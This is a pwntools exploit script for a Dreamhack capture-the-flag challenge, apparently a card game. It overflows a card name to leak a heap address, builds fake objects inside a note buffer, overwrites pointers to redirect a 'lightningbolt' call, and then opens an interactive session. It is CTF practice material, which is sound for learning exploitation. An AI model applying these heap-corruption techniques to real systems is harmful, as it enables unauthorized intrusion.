from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games',  16624
r = remote(HOST, PORT)

def show_status():
    r.sendlineafter(b'> ', b'1')

def play_card(card, target):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', b'%d'%card)
    r.sendlineafter(b': ', b'%d'%target)

def resolve_stack():
    r.sendlineafter(b'> ', b'3')

def leave_note(note):
    r.sendlineafter(b'> ', b'4')
    r.sendafter(b': ', note)

def print_note():
    r.sendlineafter(b'> ', b'5')

def rename_card(name):
    r.sendlineafter(b'> ', b'6')
    r.sendafter(b'...\n', name)

rename_card(b'A'*0x2c)
play_card(1, 2)
show_status()
r.recvuntil(b'Stack: ')
r.recvuntil(b'A'*36)
user = u64(r.recvline().strip().ljust(8,b'\x00'))
enemy = user - 0x60
note = user + 0x60
lightningbolt = user - 0x2544

fake = note - 0x28
payload = p64(enemy) + p64(lightningbolt)
for i in range(1, 5):
    payload += p64(fake + 0x18*i)
    payload += p64(enemy) + p64(lightningbolt)

leave_note(payload)

rename_card(b'A'*0x2c + p64(lightningbolt) + p64(fake))
play_card(2, 1)
play_card(3, 1)

resolve_stack()

r.interactive()